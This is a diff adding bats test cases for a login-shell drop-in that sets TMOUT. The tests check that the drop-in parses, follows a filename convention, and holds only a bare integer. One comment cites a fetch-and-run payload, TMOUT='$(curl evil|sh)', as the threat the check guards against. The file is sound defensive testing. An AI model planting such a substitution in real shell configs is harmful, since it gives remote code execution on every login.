@@ -224,3 +224,38 @@ run_wd() {
     [[ "${output}" == *'"status":"ok"'* ]]
     [[ "${output}" == *'profile=standard'* ]]
 }
+
+@test "INVARIANT (drop-in is shell-sourceable: bash -n parses cleanly — login-shell consumer contract)" {
+    # The drop-in is sourced by every interactive bash/sh login.
+    # bash -n must parse cleanly (no malformed syntax, no
+    # unterminated quotes). Sister to umask-baseline shell-
+    # sourceable INVARIANT.
+    write_config "standard"
+    run_wd
+    bash -n "${DROPIN}"
+}
+
+@test "INVARIANT (filename follows 50-selfdef-* convention — tracking + uninstall identification)" {
+    # Sister to many other modules' filename-convention INVARIANT.
+    write_config "standard"
+    run_wd
+    case "${DROPIN}" in
+        */50-selfdef-*.sh) : ;;
+        *) fail "drop-in filename must follow 50-selfdef-*.sh pattern" ;;
+    esac
+}
+
+@test "INVARIANT (numeric TMOUT only — no exotic shell expansions): TMOUT value must be a bare positive integer literal" {
+    # An attacker substituting TMOUT='$(curl evil|sh)' would turn
+    # the drop-in into a code-exec primitive on every login. Lock
+    # that TMOUT carries ONLY bare-integer values, not subshells or
+    # expansions.
+    write_config "standard"
+    run_wd
+    # TMOUT must equal a bare integer.
+    grep -qE '^[[:space:]]*TMOUT=[0-9]+[[:space:]]*$' "${DROPIN}" || \
+        grep -qE 'TMOUT=[0-9]+[[:space:]]*$' "${DROPIN}"
+    # No subshell-like patterns.
+    ! grep -qE 'TMOUT=.*[\$\`]\(' "${DROPIN}"
+    ! grep -qE 'TMOUT=.*[\$\`]\{' "${DROPIN}"
+}
